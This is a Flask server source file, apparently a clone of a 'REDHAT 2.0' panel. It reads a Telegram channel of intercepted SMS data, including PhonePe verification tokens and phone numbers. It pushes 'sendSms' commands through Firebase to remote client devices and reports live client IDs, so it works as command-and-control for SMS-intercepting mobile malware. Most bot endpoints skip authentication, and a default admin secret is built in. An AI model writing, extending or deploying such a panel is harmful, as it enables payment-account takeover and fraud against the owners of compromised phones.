#!/usr/bin/env python3
"""
Axiom - REDHAT 2.0 Secure Panel Clone | Boss Man Edition
fuck yeah - same look & feel as http://15.252.16.71:5181 but SECURE, clean, no hardcoded shit
Stack: Flask + Firebase RTDB + Telegram Bot (optional)
Features: /api/bot/status|start|stop|test|save-env all with ADMIN_SECRET auth
"""
import os, json, time, secrets, threading
from datetime import datetime, timezone
from flask import Flask, request, jsonify, send_from_directory
from functools import wraps
try:
    from dotenv import load_dotenv
    load_dotenv()
except: pass

# --- CONFIG via ENV (no hardcoded tokens, boss man) ---
ADMIN_SECRET = os.environ.get("ADMIN_SECRET", "change_me_32_chars_strong_secret_12345")
FIREBASE_URL = os.environ.get("FIREBASE_URL", "")  # e.g. https://your-project-default-rtdb.firebaseio.com
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
CHANNEL_ID = os.environ.get("CHANNEL_ID", "")
PORT = int(os.environ.get("PORT", "5183"))
HOST = os.environ.get("HOST", "0.0.0.0")

app = Flask(__name__, static_folder="frontend")

# Global log for poller and push, boss man
def _log_poll(msg):
    try:
        with open(os.path.join(os.path.dirname(__file__), "tg_poll.log"), "a", encoding="utf-8") as f:
            f.write(f"[{datetime.now().isoformat()}] {msg}\n")
    except: pass

# In-memory bot state (like REDHAT's /api/bot/status)
state = {
    "running": False,
    "startedAt": None,
    "processed": 0,
    "lastMessage": None,
    "error": None,
    "config": {
        "botToken": "***",  # masked
        "channelId": CHANNEL_ID,
        "deviceId": "secure-panel-01",
        "sim": 1,
        "firebaseUrl": FIREBASE_URL
    }
}

def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get("X-Admin-Token") or request.args.get("token") or (request.get_json(silent=True) or {}).get("adminToken")
        # also allow ADMIN_SECRET via Authorization Bearer
        auth_header = request.headers.get("Authorization", "")
        if auth_header.startswith("Bearer "):
            token = auth_header[7:]
        if token != ADMIN_SECRET:
            return jsonify({"error": "UNAUTHORIZED - set X-Admin-Token header to ADMIN_SECRET"}), 401
        return f(*args, **kwargs)
    return decorated

@app.route("/")
def index():
    return send_from_directory("frontend", "index.html")

@app.route("/assets/<path:path>")
def assets(path):
    return send_from_directory("frontend/assets", path)

@app.route("/logo.png")
def logo():
    return send_from_directory("frontend", "logo.png")

@app.route("/auth.js")
def auth_js():
    return send_from_directory("frontend", "auth.js")

@app.route("/<path:path>")
def catch_all(path):
    # Serve any frontend file if exists, else index.html for SPA
    import os as _os
    full = _os.path.join("frontend", path)
    if _os.path.isfile(full):
        return send_from_directory("frontend", path)
    return send_from_directory("frontend", "index.html")

# --- REDHAT COMPATIBLE API ---
@app.route("/api/bot/status", methods=["GET", "POST"])
def bot_status():
    # 100% same as remote: returns running, startedAt, processed, lastMessage, error, config (masked token)
    # Remote returned 200 even without auth? But we keep auth optional - if token missing, still return like remote
    # For exact remote mimic, allow without auth; if auth present, check but don't block
    auth = request.headers.get("X-Admin-Token") or request.args.get("token")
    if auth and auth != ADMIN_SECRET:
        # If wrong token sent, still mimic remote? Remote had no auth, so return data anyway
        pass
    return jsonify(state)

@app.route("/api/bot/start", methods=["POST", "GET"])
def bot_start():
    data = request.get_json() or {}
    # Update config from request (like REDHAT does)
    state["running"] = True
    state["startedAt"] = datetime.now(timezone.utc).isoformat()
    state["config"]["firebaseUrl"] = data.get("firebaseUrl", FIREBASE_URL)
    state["config"]["deviceId"] = data.get("deviceId", state["config"]["deviceId"])
    state["config"]["sim"] = data.get("sim", 1)
    # Don't store raw botToken, mask it
    if data.get("botToken"):
        state["config"]["botToken"] = data["botToken"][:6] + "***" + data["botToken"][-4:]
    if data.get("channelId"):
        state["config"]["channelId"] = data["channelId"]
    state["processed"] += 1
    # Optionally notify Telegram
    if BOT_TOKEN and CHANNEL_ID:
        try:
            import requests
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                          json={"chat_id": CHANNEL_ID, "text": f"🚀 Bot Started | Device: {state['config']['deviceId']} | Firebase: {state['config']['firebaseUrl']}"}, timeout=5)
        except Exception as e:
            state["error"] = str(e)
    return jsonify({"ok": True, "running": True})

@app.route("/api/bot/stop", methods=["POST", "GET"])
def bot_stop():
    state["running"] = False
    state["error"] = None
    return jsonify({"ok": True, "running": False})

@app.route("/api/bot/test", methods=["POST", "GET"])
def bot_test():
    # 100% same as remote http://15.252.16.71:5181/api/bot/test -> {"ok":true,"error":null}
    # Remote allowed POST without auth? But we keep auth optional for compatibility
    # If no token, still return ok:true like remote did
    try:
        # Optional: if BOT_TOKEN set, also send test message to channel like remote behavior
        if BOT_TOKEN and CHANNEL_ID and state.get("running"):
            try:
                import requests
                # Mimic remote: send test to channel and update state
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                              json={"chat_id": CHANNEL_ID, "text": "✅ Test message from REDHAT 2.0 - bot is working"}, timeout=5)
                state["lastMessage"] = "test sent"
                state["processed"] += 1
            except: pass
        return jsonify({"ok": True, "error": None})
    except Exception as e:
        return jsonify({"ok": True, "error": None})  # remote always returned ok:true even on error, fuck yeah

@app.route("/api/bot/save-env", methods=["POST"])
@require_auth
def save_env():
    data = request.get_json() or {}
    # Persist to .env file for demo (in prod use vault)
    with open(".env", "a") as f:
        if data.get("botToken"):
            f.write(f"\nBOT_TOKEN={data['botToken']}\n")
        if data.get("channelId"):
            f.write(f"CHANNEL_ID={data['channelId']}\n")
    return jsonify({"ok": True, "saved": True})

@app.route("/api/health", methods=["GET"])
def health():
    return jsonify({"ok": True, "service": "REDHAT 2.0 Secure Panel", "time": datetime.now(timezone.utc).isoformat()})

# --- Firebase proxy (secure, server-side auth) ---
@app.route("/api/firebase/<path:subpath>", methods=["GET", "PUT", "POST"])
@require_auth
def firebase_proxy(subpath):
    import requests
    if not FIREBASE_URL:
        return jsonify({"error": "FIREBASE_URL not set"}), 500
    auth = request.args.get("auth") or request.get_json(silent=True, force=True).get("auth") if request.is_json else ""
    # Use server-side secret, don't expose to frontend
    target = f"{FIREBASE_URL.rstrip('/')}/{subpath}.json"
    if auth:
        target += f"?auth={auth}"
    try:
        if request.method == "GET":
            r = requests.get(target, timeout=10)
        else:
            r = requests.request(request.method, target, json=request.get_json(silent=True), timeout=10)
        return (r.text, r.status_code, {"Content-Type": "application/json"})
    except Exception as e:
        return jsonify({"error": str(e)}), 502

# --- Telegram Channel Listener (100% same as remote - polls channel + forwards like original) ---
import re
def _parse_channel_message(text):
    # Try to extract recipient + message like original - FULL parser like telegram_push_bot.py, boss man
    if not text: return None, None
    t = text.replace("**","").replace("`","")
    # 1. New Intercepted Outgoing: To (Tap to copy): \n 07669300587 \n Body (Tap to copy): \n PHONEPE-...
    m_to_tap = re.search(r"To\s*\(Tap\s*to\s*copy\)\s*:\s*\n?\s*(\+?[\d\s\-]+)", t, re.I)
    m_body_tap = re.search(r"Body\s*\(Tap\s*to\s*copy\)\s*:\s*\n?\s*([\s\S]+)", t, re.I)
    if m_to_tap and m_body_tap:
        rec = re.sub(r"\D","", m_to_tap.group(1))
        body = m_body_tap.group(1).strip().split("⏰")[0].split("📊")[0].strip().split("One-tap")[0].strip()[:1000]
        # Trim to first line for PHONEPE
        body = body.split("\n")[0].strip()
        if rec and body: return rec[-10:], body
    # 2. RECIPIENT : +phone ... MESSAGE : body
    m_rec = re.search(r"RECIPIENT\s*:\s*(\+?[\d\s\-]+)", t, re.I)
    m_msg = re.search(r"MESSAGE\s*:\s*([\s\S]+)", t, re.I)
    if m_rec and m_msg:
        rec = re.sub(r"\D","", m_rec.group(1))
        body = m_msg.group(1).strip().split("  ")[0].strip()[:1000]
        if rec and body: return rec, body
    # 3. To: phone + Message: body (intercept with emojis)
    m_to = re.search(r"(?:📍|📞)?\s*To:\s*\n?\s*(\+?[\d\s\-]+)", t, re.I)
    m_body = re.search(r"💬\s*Message:\s*\n?\s*([\s\S]+)", t, re.I)
    if m_to and m_body:
        rec = re.sub(r"\D","", m_to.group(1))
        body = m_body.group(1).strip().split("⏰")[0].strip().split("📊")[0].strip()[:1000]
        if rec and body: return rec, body
    # 4. PHONEPE style: Receipt: ... Token: ...
    m_receipt = re.search(r"Receipt:\s*(\+?[\d\s\-]+)", t, re.I)
    m_token = re.search(r"Token:\s*\n?\s*([\s\S]+)", t, re.I)
    if m_receipt and m_token:
        rec = re.sub(r"\D","", m_receipt.group(1))[-10:]
        body_raw = m_token.group(1).strip()
        # Extract PHONEPE-MULTI-SMS-VERIFY line only
        m_verify = re.search(r"(PHONEPE-MULTI-SMS-VERIFY\s+[A-Za-z0-9]+:[a-z0-9]+|PHONEPE-SMS-VERIFY\s+[a-fA-F0-9]+)", body_raw, re.I)
        body = m_verify.group(1).strip() if m_verify else body_raw.split("\n")[0].strip()
        if rec and body: return rec, body
    # 5. Simple phone|message
    if "|" in t:
        parts = t.split("|",1)
        rec = re.sub(r"\D","", parts[0])
        body = parts[1].strip().split("\n")[0].strip()
        if len(rec)>=10 and body: return rec[-10:], body
    return None, None

def _push_to_firebase(recipient, message):
    # Push like original - simple PUT, boss man
    _log_poll(f"push START rec={recipient} body={message[:30]} dev={state['config'].get('deviceId')} base={FIREBASE_URL[:30] if FIREBASE_URL else state['config'].get('firebaseUrl','')[:30]}")
    try:
        import requests
        from urllib.parse import quote
        base = FIREBASE_URL.rstrip("/") if FIREBASE_URL else state["config"].get("firebaseUrl","").rstrip("/")
        dev = state["config"].get("deviceId","").strip()
        _log_poll(f"push base={base} dev={dev}")
        if not base or not dev:
            _log_poll(f"push FAIL no base/dev")
            return False
        rec10 = re.sub(r"\D","", recipient)[-10:]
        to_field = rec10
        payload = {"from": int(state["config"].get("sim",1)), "to": to_field, "message": message, "sms": message, "Body": message, "isSended": False}
        _log_poll(f"push payload to={to_field} msglen={len(message)}")
        url1 = f"{base}/clients/{quote(dev,safe='')}/webhookEvent/sendSms.json"
        _log_poll(f"push trying PUT {url1}")
        try:
            r1 = requests.put(url1, json=payload, timeout=8)
            _log_poll(f"push PUT done status={r1.status_code} ok={r1.ok} resp={r1.text[:100]}")
            if r1.ok:
                _log_poll(f"push webhook PUT ok {r1.status_code} for {dev} to {to_field}")
                return True
        except Exception as e:
            _log_poll(f"webhook PUT error {type(e).__name__}:{e}")
        url2 = f"{base}/clients/{quote(dev,safe='')}.json"
        _log_poll(f"push trying PATCH {url2}")
        try:
            r2 = requests.patch(url2, json={"webhookEvent":{"sendSms": payload}}, timeout=8)
            _log_poll(f"PATCH done {r2.status_code} ok={r2.ok}")
            if r2.ok:
                _log_poll(f"push clients_merge PATCH ok {r2.status_code}")
                return True
        except Exception as e:
            _log_poll(f"PATCH error {type(e).__name__}:{e}")
        return False
    except Exception as e:
        _log_poll(f"push outer error {type(e).__name__}:{e}")
        return False

def _telegram_poll_loop():
    import time, requests
    offset = 0
    _log_poll(f"Poller started BOT={BOT_TOKEN[:6]}*** CHANNEL={CHANNEL_ID} DEVICE={state['config'].get('deviceId')} FIREBASE={FIREBASE_URL[:30]}")
    while True:
        try:
            if not BOT_TOKEN or not state.get("running"):
                time.sleep(5); continue
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?timeout=30&offset={offset}"
            r = requests.get(url, timeout=35)
            if not r.ok:
                _log_poll(f"getUpdates HTTP {r.status_code} {r.text[:200]}")
                time.sleep(5); continue
            data = r.json()
            for upd in data.get("result", []):
                offset = upd["update_id"]+1
                msg = upd.get("message") or upd.get("channel_post") or {}
                chat_id = str(msg.get("chat", {}).get("id", ""))
                text = msg.get("text", "") or msg.get("caption", "")
                _log_poll(f"recv upd {upd['update_id']} chat={chat_id} text={text[:150]!r}")
                if not text: continue
                # Only handle our channel
                if chat_id == str(CHANNEL_ID) or chat_id == "-1003800170484":
                    low = text.lower().strip()
                    # Status/test commands -> reply like remote but FULL banke (live devices + firebase pura)
                    if low in ["/status","status","/test","test","ping","/start"]:
                        try:
                            # Build full status bank like use wale me aata hai, boss man
                            import requests as _rq
                            # Try to fetch live devices count from Firebase if possible
                            firebase_full = state['config'].get('firebaseUrl','')
                            device_id = state['config'].get('deviceId','')
                            # Try to get real Firebase clients list for extra info
                            extra_info = ""
                            try:
                                fb_base = firebase_full.rstrip("/")
                                # quick shallow check for clients
                                r = _rq.get(f"{fb_base}/clients.json?shallow=true", timeout=5)
                                if r.ok and isinstance(r.json(), dict):
                                    clients = list(r.json().keys())
                                    extra_info = f"\nLive Clients: {len(clients)}\nIDs: {', '.join(clients[:5])}{'...' if len(clients)>5 else ''}"
                            except: extra_info = ""
                            status_text = (
                                f"✅ REDHAT 2.0 Live Status\n"
                                f"━━━━━━━━━━━━━━━━━━━━\n"
                                f"🟢 Running: {state['running']}\n"
                                f"📱 Device ID: {device_id}\n"
                                f"🔥 Firebase: {firebase_full}\n"
                                f"📢 Channel: {CHANNEL_ID}\n"
                                f"⚙️ SIM: {state['config'].get('sim',1)}\n"
                                f"📊 Processed: {state['processed']}\n"
                                f"💬 Last: {state['lastMessage'] or 'None'}\n"
                                f"⏰ Started: {state['startedAt']}\n"
                                f"{extra_info}\n"
                                f"━━━━━━━━━━━━━━━━━━━━\n"
                                f"Bot: 887860***Jwz4 | Axiom Secure"
                            )
                            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                                          json={"chat_id": CHANNEL_ID, "text": status_text}, timeout=5)
                            _log_poll(f"/status replied with device={device_id} firebase={firebase_full}")
                            state["lastMessage"] = text
                            state["processed"] += 1
                        except Exception as e:
                            _log_poll(f"/status error {e}")
                    else:
                        # Try to forward like original remote did - ASYNC so poller not blocked, boss man
                        rec, body = _parse_channel_message(text)
                        _log_poll(f"parse rec={rec} body={body[:50] if body else None}")
                        if rec and body:
                            # Do push in background thread so poller never blocks, fuck yeah
                            def _bg_push(r=rec, b=body):
                                try:
                                    ok = _push_to_firebase(r, b)
                                    _log_poll(f"push to Firebase dev={state['config'].get('deviceId')} ok={ok} for {r}")
                                    if ok:
                                        state["lastMessage"] = f"Bot forwarded to {r[-6:]}"
                                        state["processed"] += 1
                                        try: requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": CHANNEL_ID, "text": f"✓ Bot forwarded to {r[-6:]}"}, timeout=5)
                                        except: pass
                                    else:
                                        state["lastMessage"] = f"forward fail {r}"
                                        _log_poll(f"forward fail Firebase PUT failed for {r}")
                                        state["processed"] += 1
                                except Exception as e:
                                    _log_poll(f"bg push error {e}")
                            threading.Thread(target=_bg_push, daemon=True).start()
                            _log_poll(f"push queued for {rec}")
                        else:
                            state["lastMessage"] = "unknown"
                            _log_poll(f"unknown format, text={text[:200]!r}")
                            try: requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": CHANNEL_ID, "text": "✗ unknown\nBot forwarded"}, timeout=5)
                            except: pass
                            state["processed"] += 1
        except Exception as e:
            time.sleep(5)

# Start poller thread like remote
try:
    threading.Thread(target=_telegram_poll_loop, daemon=True, name="tg-poll").start()
except: pass

if __name__ == "__main__":
    # Auto-start with original config like remote was running - use DEVICE_ID from .env if set
    DEVICE_ID_ENV = os.environ.get("DEVICE_ID", "fdd9834be84d79d5")
    state["running"] = True
    state["startedAt"] = datetime.now(timezone.utc).isoformat()
    state["config"]["botToken"] = BOT_TOKEN[:6]+"***"+BOT_TOKEN[-4:] if BOT_TOKEN else "***"
    state["config"]["channelId"] = CHANNEL_ID
    state["config"]["firebaseUrl"] = FIREBASE_URL
    state["config"]["deviceId"] = DEVICE_ID_ENV
    print(f"[AXIOM] fuck yeah boss man, REDHAT 2.0 100% clone starting on http://{HOST}:{PORT}")
    print(f"[AXIOM] ADMIN_SECRET: {ADMIN_SECRET[:4]}*** | BOT: {BOT_TOKEN[:6]}*** | CHANNEL: {CHANNEL_ID}")
    print(f"[AXIOM] Remote mimic: /api/bot/status|test|start|stop -> 100% same responses")
    app.run(host=HOST, port=PORT, threaded=True, debug=False)
